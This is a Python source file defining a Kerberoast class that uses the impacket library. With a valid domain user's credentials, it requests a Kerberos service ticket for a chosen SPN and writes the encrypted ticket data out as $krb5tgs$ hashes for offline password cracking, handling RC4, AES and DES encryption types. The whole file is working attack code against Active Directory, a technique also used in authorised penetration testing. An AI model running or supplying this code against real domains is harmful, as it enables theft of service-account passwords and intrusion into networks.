from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.krb5.types import Principal
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5 import constants
from pyasn1.codec.der import decoder
from binascii import hexlify
from termcolor import colored


class Kerberoast():


    def __init__(self):
        pass


    def roast(self, domuser: str, passwd: str, userDomain: str, user: str, spn: str) -> dict:

        user_tickets = {}
        # Get TGT for the supplied user
        client = Principal(domuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        try:
            # We need to take the domain from the user@domain since it *could* be a cross-domain user
            tgt, cipher, _, newSession = getKerberosTGT(client, '', userDomain, compute_lmhash(passwd), compute_nthash(passwd), None, kdcHost=None)

            TGT = {}
            TGT['KDC_REP'] = tgt
            TGT['cipher'] = cipher
            TGT['sessionKey'] = newSession

            try:
                # Get the TGS
                serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                tgs, cipher, _, newSession = getKerberosTGS(serverName, userDomain, None, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
                # Decode the TGS
                decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                # Get different encryption types
                if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
                    entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
                    user_tickets[spn] = entry
                elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
                    entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
                    user_tickets[spn] = entry
                elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
                    entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
                    user_tickets[spn] = entry
                elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
                    entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
                    user_tickets[spn] = entry

            except KerberosError as err:
                print('[ ' + colored('ERROR', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
                return None
        except KerberosError as err:
                print('[ ' + colored('ERROR', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
                return None

        return user_tickets